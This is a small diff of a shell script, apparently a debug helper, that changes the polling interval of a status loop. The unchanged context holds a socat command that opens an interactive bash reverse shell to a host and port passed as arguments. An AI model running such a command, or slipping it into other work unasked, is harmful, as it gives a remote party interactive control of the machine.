@@ -10,4 +10,4 @@
 
 echo "[+] Shelling out to $1:$2..."
 ( socat tcp-connect:$1:$2 exec:'bash -li',pty,stderr,setsid,sigint,sane || echo "Debug shell not listening." ) &
-while jobs %% >/dev/null 2>/dev/null; do echo "Shell to port $1:$2 still running..."; sleep 10; done
+while jobs %% >/dev/null 2>/dev/null; do echo "Shell to port $1:$2 still running..."; sleep 2; done
